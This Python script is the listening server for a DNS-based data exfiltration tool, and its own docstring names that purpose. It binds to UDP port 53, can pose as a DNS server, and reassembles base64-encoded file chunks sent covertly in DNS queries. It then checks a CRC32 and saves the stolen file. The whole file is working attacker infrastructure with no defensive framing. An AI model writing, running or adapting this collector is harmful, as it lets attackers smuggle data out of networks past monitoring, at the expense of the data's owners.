#!/usr/bin/env python

import os
import sys
import zlib
import time
import socket
from base64 import b64decode, b64encode

"""
This file is meant to assist in data exfiltration over DNS queries.
It can be sniffed by the DNS server alone.
Hostname given should be owned by the DNS server you own.
DNS requests built with this: http://www.ccs.neu.edu/home/amislove/teaching/cs4700/fall09/handouts/project1-primer.pdf
"""

# Constants
READ_BINARY = "rb"
WRITE_BINARY = "wb"
MAX_PAYLOAD_SIZE = "76"
INITIATION_STRING = "INIT_445"
DELIMITER = "::"
NULL = "\x00"
DATA_TERMINATOR = "\xcc\xcc\xcc\xcc\xff\xff\xff\xff"

def dns_server(host="localhost", port=53, play_dead=True):
	"""
	This will listen on the 53 port without killing a DNS server if there.
	It will save incoming files from exfiltrator.
	:param host: host to listen on.
	:param port: 53 by default
	:param play_dead: Should i pretend to be a DNS server or just be quiet?
	:return:
	"""

	# Try opening socket and listen
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	except socket.error as msg :
		sys.stderr.write('Failed to create socket. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
		raise

	# Try binding to the socket
	try:
		s.bind((host, port))
	except socket.error as msg:
		sys.stderr.write('Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
		raise

	# Will keep connection alive as needed
	while 1:
		# receive data from client (data, addr)
		d = s.recvfrom(1024)
		data = d[0].decode()
		addr = d[1]

		if data.find(INITIATION_STRING) != -1:
			# Found initiation packet:
			offset_delimiter = data.find(DELIMITER) + len(DELIMITER)
			filename = data[data.find(INITIATION_STRING) + len(INITIATION_STRING):data.find(DELIMITER)]
			crc32 = data[offset_delimiter: -1]
			sys.stdout.write("Initiation file transfer from " + str(addr) + " with file: " + str(filename) + "\n\n")
			file_list = []
			chunks_count = 0

		elif data.find(DATA_TERMINATOR+NULL+DATA_TERMINATOR) == -1 and data.find(INITIATION_STRING) == -1:
			# Found data packet:
			len_head = len("\x00\x00\x01\x00\x01")
			end_of_payload = data.find(DATA_TERMINATOR) #the upper limit of the data to exfiltrate
			end_of_header = data.find("\x00\x00\x01\x00\x01")
			file_list.append(data[end_of_header + len_head: end_of_payload]) #adding the length to get the first index of the payload
			chunks_count += 1

		elif data.find(DATA_TERMINATOR+NULL+DATA_TERMINATOR):
			# Found termination packet:
			actual_file = bytearray()
			for file in file_list:
				actual_file += b64decode(file.encode())
			# Will now compare CRC32s:
			if crc32 == str(zlib.crc32(actual_file)):
				sys.stdout.write("CRC32 match! Now saving file")
				fh = open(filename, WRITE_BINARY)
				fh.write(actual_file)
				fh.close()
				#replay = "Got it. Thanks :)"
				#s.sendto(replay.encode(), addr)

			else:
				sys.stderr.write("CRC32 not match. Not saving file.\n")
				#replay = "You fucked up!".encode()
				#s.sendto(replay, addr)

			filename = ""
			crc32 = ""
			i = 0
			addr = ""
		
		else:
			sys.stdout.write("Regular packet. Not listing it.")

	s.close()
	return 0

dns_server()